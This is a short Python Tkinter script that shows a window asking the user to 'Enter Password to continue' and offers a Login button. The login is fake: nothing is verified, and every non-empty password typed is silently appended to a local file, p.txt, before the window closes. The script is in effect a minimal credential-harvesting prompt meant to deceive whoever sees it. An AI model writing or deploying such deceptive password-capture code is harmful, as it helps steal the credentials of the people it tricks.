from tkinter import *
from tkinter import messagebox

root = Tk()

label  = Label(root, text = "Enter Password to continue", font=("Arial Black",15,"bold"))
label.pack()
entry  = Entry(root,font = ("Arial",10))
entry.pack()
def login():
    file  = open("p.txt","a")
    password = entry.get()
    if password != "":
        file.write("\n"+'"'+password+'"')
        file.close()
        root.destroy()
    
button = Button(root,text="Login",command=login , font = ("Arial Black" , 14, "bold"))
button.pack(padx =10,pady =5)

root.mainloop()